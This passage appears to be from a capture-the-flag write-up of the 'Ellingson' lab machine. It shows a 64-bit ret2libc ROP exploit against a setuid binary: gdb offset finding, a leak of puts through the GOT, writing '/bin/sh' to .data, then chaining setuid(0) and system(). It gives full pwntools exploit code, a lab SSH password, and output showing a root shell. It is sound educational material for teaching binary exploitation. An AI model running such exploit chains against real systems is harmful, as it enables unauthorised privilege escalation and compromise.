<p>In creating 64-bit ROP chains, the value of the <span style="color:orange">$rdi</span> register can be used to pass a first argument to a function (followed by <span style="color:orange">$rsi</span>, <span style="color:orange">$rdx</span>, <span style="color:orange">$rcx</span>, <span style="color:orange">$r8</span>, then <span style="color:orange">$r9</span>). To summarize the code snippet above, the address <strong><code class="highlighter-rouge">[rbp-0x80]</code></strong> is saved to <strong><code class="highlighter-rouge">$rax</code></strong> which is then moved to <strong><code class="highlighter-rouge">$rdi</code></strong>. <strong><code class="highlighter-rouge">[rbp-0x80]</code></strong> is now the effective address where the function call <strong><code class="highlighter-rouge">gets@plt</code></strong> will save the input from STDIN.</p>

<p>External function calls such as <strong><code class="highlighter-rouge">gets@plt</code></strong> are using dynamic linkers (e.g. <strong>ld.so</strong>) to resolve the address of <strong><code class="highlighter-rouge">libc</code></strong> functions during run-time and are saved to the <span style="color:orange">GOT (Global Offset Table)</span>. The <strong>GOT</strong> serves as a reference for all external function calls or anything that is referenced to a shared library then the <span style="color:orange">PLT (Procedure Linkage Table)</span> serves as a means for the compiled executable to access such functions.</p>

<p>Since there is an address space that is writable (using <strong><code class="highlighter-rouge">gets@plt</code></strong>) and there is an easy way to view stored values (using <strong><code class="highlighter-rouge">puts@plt</code></strong>), it could be used to leak addresses from the libc.so file required by the executable to gain total control over the binary in order to gain command execution.</p>

<h3 id="exploitpy-finding-the-right-offset">exploit.py (Finding the right offset)</h3>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="s">"0x80"</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>	<span class="c1"># OFFSET
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">8</span>			<span class="c1"># BASE POINTER
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"C"</span> <span class="o">*</span> <span class="mi">8</span>                      <span class="c1"># RETURN ADDRESS PLACEHOLDER
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> <span class="k">*</span> 0x0000000000401569  <span class="c"># function call after gets@plt</span>

  Breakpoint 1 at 0x401569

<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> <span class="k">*</span> 0x0000000000401618  <span class="c"># auth() function's return call</span>

  Breakpoint 1 at 0x401618

<span class="o">(</span>gdb<span class="o">)</span> run <span class="o">&lt;&lt;&lt;</span> <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print "A"*int("0x80",16) + "B"*8 + "C"*8'</span><span class="si">)</span>

<span class="o">(</span>gdb<span class="o">)</span> x/18xg <span class="nv">$rbp</span><span class="nt">-0x80</span>

  0x7ffddfc8e0b0: 0x4141414141414141	0x4141414141414141
  0x7ffddfc8e0c0: 0x4141414141414141	0x4141414141414141
  0x7ffddfc8e0d0: 0x4141414141414141	0x4141414141414141
  0x7ffddfc8e0e0: 0x4141414141414141	0x4141414141414141
  0x7ffddfc8e0f0: 0x4141414141414141	0x4141414141414141
  0x7ffddfc8e100: 0x4141414141414141	0x4141414141414141
  0x7ffddfc8e110: 0x4141414141414141	0x4141414141414141
  0x7ffddfc8e120: 0x4141414141414141	0x4141414141414141
  0x7ffddfc8e130: 0x4242424242424242	0x4343434343434343

<span class="o">(</span>gdb<span class="o">)</span> c

<span class="o">(</span>gdb<span class="o">)</span> x/xg <span class="nv">$rsp</span>

  0x7ffd9762c1f8: 0x4343434343434343

</code></pre></div></div>

<p>The address space where the user inputs a password for authentication is stored in <strong><code class="highlighter-rouge">[rbp-0x80]</code></strong>. Since the return address is, in this case, 8 bytes away from the base pointer, writing 8 bytes beyond <strong><code class="highlighter-rouge">[rbp-0x80]</code></strong> would overwrite the value of <strong><code class="highlighter-rouge">$rbp</code></strong> and another 8 bytes would overwrite the return address.</p>

<p>The <strong><code class="highlighter-rouge">return</code></strong> call of the <strong><code class="highlighter-rouge">auth()</code></strong> function is now overwritten to be <strong><code class="highlighter-rouge">CCCCCCCC</code></strong> or <strong><code class="highlighter-rouge">4343434343434343</code></strong></p>

<h3 id="exploitpy-leaking-the-address-of-a-libc-function">exploit.py (Leaking the address of a libc function)</h3>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ropper <span class="nt">--file</span> ./garbage <span class="nt">--search</span> <span class="s2">"% ?di"</span>
<span class="go">
  ...omitted...
</span><span class="gp">  0x000000000040179b: pop rdi;</span><span class="w"> </span>ret<span class="p">;</span>
<span class="go">
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> info functions

  ...omitted...
  0x0000000000401050  puts@plt
  ...omitted...
  0x0000000000401100  gets@plt
  ...omitted...
  0x0000000000401619  main
  ...omitted...

<span class="o">(</span>gdb<span class="o">)</span> disassemble 0x0000000000401050

  0x0000000000401050 &lt;+0&gt;:	jmpq   <span class="k">*</span>0x2fd2<span class="o">(</span>%rip<span class="o">)</span>        <span class="c"># 0x404028 &lt;puts@got.plt&gt;</span>
  0x0000000000401056 &lt;+6&gt;:	pushq  <span class="nv">$0x2</span>
  0x000000000040105b &lt;+11&gt;:	jmpq   0x401020

</code></pre></div></div>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">pwnable</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./garbage"</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="s">"0x80"</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>	<span class="c1"># OFFSET
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">8</span>			<span class="c1"># BASE POINTER
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span>                <span class="c1"># pop rdi; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404028</span><span class="p">)</span>                <span class="c1"># puts@got.plt
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401050</span><span class="p">)</span>                <span class="c1"># puts@plt
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401619</span><span class="p">)</span>                <span class="c1"># main &lt;+0&gt;
</span>
<span class="n">pwnable</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">pwnable</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"denied.</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">puts_leaked</span> <span class="o">=</span> <span class="n">pwnable</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>

<p>This process sets the value of <strong><code class="highlighter-rouge">$rdi</code></strong> to be the address of <strong><code class="highlighter-rouge">puts@got.plt</code></strong> directly offset from the libc shared object. <strong><code class="highlighter-rouge">$rdi</code></strong> then gets passed as an argument to the function, <strong><code class="highlighter-rouge">puts@plt</code></strong> then output to STDOUT. This process is essential to be able to infer the libc version being used by the infected machine (ellingson).</p>

<p>The exploit returns back to the main function. Since the executable is still running, the libc dynamically linked to the executable is still in the same address which means that the address leaked using the exploit above is still useful. The process of creating a ROP payload then returning to <strong><code class="highlighter-rouge">main</code></strong> can be repeated until all preparations to achieve command execution are completed.</p>

<h3 id="exploitpy-write-binsh-to-a-data-segment">exploit.py (Write ‚Äú/bin/sh‚Äù to a data segment)</h3>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-h</span> ./garbage
<span class="go">
  Sections:
  Idx Name          Size      VMA               LMA               File off  Algn
  ...omitted...
   22 .data         00000014  00000000004040b8  00000000004040b8  000030b8  2**3
                    CONTENTS, ALLOC, LOAD, DATA
   23 .bss          00000018  00000000004040d0  00000000004040d0  000030cc  2**4
                    ALLOC
  ...omitted...

</span><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-j</span> .data <span class="nt">-s</span> ./garbage
<span class="go">
  Contents of section .data:
   4040b8 00000000 00000000 00000000 00000000  ................
   4040c8 39050000                             9...

</span></code></pre></div></div>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">pwnable</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./garbage"</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="s">"0x80"</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>	<span class="c1"># OFFSET
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">8</span>			<span class="c1"># BASE POINTER
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span>                <span class="c1"># pop rdi; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4040b8</span><span class="p">)</span>                <span class="c1"># .data segment
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401100</span><span class="p">)</span>                <span class="c1"># gets@plt
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401619</span><span class="p">)</span>                <span class="c1"># main &lt;+0&gt;
</span>
<span class="n">pwnable</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">shell</span> <span class="o">=</span> <span class="s">"/bin/sh"</span>
<span class="n">pwnable</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shell</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span><span class="o">%</span><span class="mi">8</span><span class="p">)))</span>
</code></pre></div></div>

<p><strong style="color:orange">.data segment</strong></p>
<blockquote>
  <p>a portion of an object file or the corresponding virtual address space of a program that contains initialized static variables, that is, global variables and static local variables. The size of this segment is determined by the size of the values in the program‚Äôs source code, and does not change at run time.</p>

  <p>The data segment is read-write, since the values of variables can be altered at run time. Uninitialized data, both variables and constants, is instead in the BSS segment.</p>
</blockquote>

<p>The string <strong><code class="highlighter-rouge">/bin/sh</code></strong> was written in the .data segment (which was otherwise basically empty).</p>

<h3 id="exploitpy-calculate-the-libc-offsets">exploit.py (Calculate the libc offsets)</h3>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">margo@ellingson:~$</span><span class="w">  </span>ldd /usr/bin/garbage
<span class="go">
  linux-vdso.so.1 (0x00007ffc77ffb000)
</span><span class="gp">  libc.so.6 =&gt;</span><span class="w"> </span>/lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007f370379e000<span class="o">)</span>
<span class="go">  /lib64/ld-linux-x86-64.so.2 (0x00007f3703b8f000)

</span><span class="gp">$</span><span class="w"> </span>scp margo@10.10.10.139:/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
<span class="gp">$</span><span class="w"> </span>margo@10.10.10.139<span class="s1">'s password: iamgod$08
</span><span class="go">
  libc.so.6                                                              100% 1983KB

</span></code></pre></div></div>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
<span class="n">libc_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">puts_leaked</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>

<span class="n">GLIBC_setuid</span> <span class="o">=</span> <span class="n">libc_address</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'setuid'</span><span class="p">]</span>
<span class="n">GLIBC_system</span> <span class="o">=</span> <span class="n">libc_address</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">GLIBC_exit</span> <span class="o">=</span> <span class="n">libc_address</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'exit'</span><span class="p">]</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="s">"0x80"</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>	<span class="c1"># OFFSET
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">8</span>			<span class="c1"># BASE POINTER
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span>		<span class="c1"># pop rdi; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>			<span class="c1"># integer, 0
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">GLIBC_setuid</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span>                <span class="c1"># pop rdi; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4040b8</span><span class="p">)</span>                <span class="c1"># .data segment
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">GLIBC_system</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">GLIBC_exit</span><span class="p">)</span>
</code></pre></div></div>

<p>The base address of the <strong>libc</strong> is calculated by removing the offset of the leaked <strong><code class="highlighter-rouge">puts</code></strong> address. Knowing the base address of the libc used during run-time means you can call the functions you want with the right offsets. The offsets of each libc function are constant in their respective versions and architecture which could pretty much be easily computed.</p>

<h3 id="exploitpy-putting-everything-together">exploit.py (Putting everything together)</h3>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">shell</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="s">"margo"</span><span class="p">,</span> <span class="s">'10.10.10.139'</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">"iamgod$08"</span><span class="p">)</span>
<span class="n">pwnable</span> <span class="o">=</span> <span class="n">shell</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s">"/usr/bin/garbage"</span><span class="p">)</span>

<span class="c1"># ==================================================================
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="s">"0x80"</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>	<span class="c1"># OFFSET
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">8</span>			<span class="c1"># BASE POINTER
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span>                <span class="c1"># pop rdi; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404028</span><span class="p">)</span>                <span class="c1"># puts@got.plt
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401050</span><span class="p">)</span>                <span class="c1"># puts@plt
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401619</span><span class="p">)</span>                <span class="c1"># main &lt;+0&gt;
</span>
<span class="n">pwnable</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">pwnable</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"denied.</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">puts_leaked</span> <span class="o">=</span> <span class="n">pwnable</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"LEAKED ADDRESS puts@got.plt : {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">puts_leaked</span><span class="p">))))</span>

<span class="c1"># ==================================================================
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="s">"0x80"</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>	<span class="c1"># OFFSET
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">8</span>			<span class="c1"># BASE POINTER
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span>                <span class="c1"># pop rdi; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4040b8</span><span class="p">)</span>                <span class="c1"># .data segment
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401100</span><span class="p">)</span>                <span class="c1"># gets@plt
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401619</span><span class="p">)</span>                <span class="c1"># main &lt;+0&gt;
</span>
<span class="n">pwnable</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">shell</span> <span class="o">=</span> <span class="s">"/bin/sh"</span>
<span class="n">pwnable</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shell</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span><span class="o">%</span><span class="mi">8</span><span class="p">)))</span>
<span class="n">pwnable</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"denied.</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"</span><span class="se">\"</span><span class="s">{}</span><span class="se">\"</span><span class="s"> WAS WRITTEN ON {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="s">"0x4040b8"</span><span class="p">,</span> <span class="mi">16</span><span class="p">))))</span>

<span class="c1"># ==================================================================
</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
<span class="n">libc_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">puts_leaked</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>

<span class="n">GLIBC_setuid</span> <span class="o">=</span> <span class="n">libc_address</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'setuid'</span><span class="p">]</span>
<span class="n">GLIBC_system</span> <span class="o">=</span> <span class="n">libc_address</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">GLIBC_exit</span> <span class="o">=</span> <span class="n">libc_address</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'exit'</span><span class="p">]</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="s">"0x80"</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>	<span class="c1"># OFFSET
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">8</span>			<span class="c1"># BASE POINTER
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span>		<span class="c1"># pop rdi; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>			<span class="c1"># integer, 0
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">GLIBC_setuid</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span>                <span class="c1"># pop rdi; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4040b8</span><span class="p">)</span>                <span class="c1"># .data segment
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">GLIBC_system</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">GLIBC_exit</span><span class="p">)</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"setuid() : {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">GLIBC_setuid</span><span class="p">)))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"system() : {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">GLIBC_system</span><span class="p">)))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"exit()   : {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">GLIBC_exit</span><span class="p">)))</span>

<span class="n">pwnable</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">pwnable</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"denied.</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">pwnable</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<h3 id="exploitpy-running-the-exploit">exploit.py (Running the exploit)</h3>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python exploit.py
<span class="go">
  [+] Connecting to 10.10.10.139 on port 22: Done
  [*] margo@10.10.10.139:
      Distro    Ubuntu 18.04
      OS:       linux
      Arch:     amd64
      Version:  4.15.0
      ASLR:     Enabled
  [+] Starting remote process '/usr/bin/garbage' on 10.10.10.139: pid 41256
  [+] LEAKED ADDRESS puts@got.plt : 0x7ff860e879c0
  [+] "/bin/sh" WAS WRITTEN ON 0x4040b8
  [*] './libc.so.6'
      Arch:     amd64-64-little
      RELRO:    Partial RELRO
      Stack:    Canary found
      NX:       NX enabled
      PIE:      PIE enabled
  [*] setuid() : 0x7ff860eec970
  [*] system() : 0x7ff860e56440
  [*] exit()   : 0x7ff860e4a120
  [*] Switching to interactive mode
</span><span class="gp">  #</span><span class="w"> </span><span class="nv">$ </span><span class="nb">id</span>
<span class="go">  uid=0(root) gid=1002(margo) groups=1002(margo)
</span><span class="gp">  #</span><span class="w"> </span><span class="nv">$ </span><span class="nb">cat</span> /root/root.txt
<span class="go">  1cc7........................f997
</span><span class="gp">  #</span><span class="w"> </span><span class="nv">$ </span>
<span class="go">
</span></code></pre></div></div>

<p>Without setting the <strong>uid</strong> to <strong>0</strong>, the effective uid would still be <strong>1002</strong> which is still <strong><code class="highlighter-rouge">margo</code></strong>‚Äôs uid.</p>

<hr />

<h3 id="references">REFERENCES</h3>
<ul>
  <li>https://en.wikipedia.org/wiki/Hackers_(film)</li>
  <li>http://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/</li>
  <li>https://en.wikipedia.org/wiki/Data_segment</li>
</ul>

:ET